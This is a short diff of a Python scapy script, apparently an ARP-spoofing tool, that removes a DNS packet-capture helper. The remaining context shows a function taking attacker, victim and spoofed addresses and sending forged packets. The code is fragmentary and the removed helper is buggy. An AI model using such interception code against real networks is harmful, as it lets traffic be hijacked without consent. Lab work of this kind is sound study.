@@ -27,16 +27,3 @@ def interceptARP(pkt, interceptedPkt, attackerMAC, spoofIP, serverMAC, victimMAC
         # send packet to the network
         sendp(pkt, iface=networkInterface)
         print(pkt.show())
-
-#capture dns request and response packets for DNS
-def interceprDNS(pkt,  networkInterface):
-    print("get there")
-    if pkt.haslayer('UDP') and pkt.haslayer('DNS') and pkt.haslayer('IP'):
-        ip = pkt[IP].src
-        if pkt.haslayer('Ether'):
-            mac = pkt[Ether].src
-        else :
-            mac = util.getMAC(ip, networkInterface)
-    pkt.show()
-
-    return (pkt, ip, mac)
